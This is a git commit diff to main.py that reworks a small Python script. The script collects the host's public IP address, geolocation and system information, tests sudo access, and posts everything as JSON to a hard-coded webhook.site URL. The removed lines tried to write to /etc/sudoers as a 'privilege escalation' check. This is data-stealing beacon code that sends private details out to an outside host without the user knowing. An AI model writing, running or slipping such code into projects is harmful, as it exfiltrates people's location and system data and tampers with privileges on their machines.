5830c39a7dc6d3d1e36e4b20dc21da77cf1fa320
TOTOSOLEIL3 <66794099+TOTOSOLEIL3@users.noreply.github.com>
2023-02-27 23:30:42 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
-import requests
 import socket
+import requests
 import platform
 import json
 from geopy.geocoders import Nominatim
@@ -21,29 +21,24 @@ def get_system_info():
 ip_address = requests.get('https://api.ipify.org').text
 
 try:
-    with open('/etc/sudoers', 'a') as f:
-        f.write('test')
-    print('Privilege escalation successful!')
-except PermissionError:
-    print('Failed to escalate privileges.')
+    # Run the command with sudo
+    os.system('sudo ls > /dev/null')
+    privilege_escalation = 'successful'
+except:
+    privilege_escalation = 'failed'
 
-webhook_url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
-data = {'ip_address': ip_address, 'privilege_escalation': 'successful'}
-response = requests.post(webhook_url, json=data)
-print('Data sent to webhook:', response.text)
+location = get_location()
+info = get_system_info()
 
+data = {
+    "latitude": location[0],
+    "longitude": location[1],
+    "ip_address": ip_address,
+    "privilege_escalation": privilege_escalation,
+    "system_info": info
+}
 
-def send_data():
-    location = get_location()
-    info = get_system_info()
-    data = {
-        "latitude": location[0],
-        "longitude": location[1],
-        "system_info": info
-    }
-    headers = {'Content-type': 'application/json'}
-    url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
-    response = requests.post(url, data=json.dumps(data), headers=headers)
-    print(response.content)
-
-send_data()
+headers = {'Content-type': 'application/json'}
+url = 'https://webhook.site/c1102c25-1570-48f6-90c2-095d83eea189'
+response = requests.post(url, data=json.dumps(data), headers=headers)
+print(response.content)
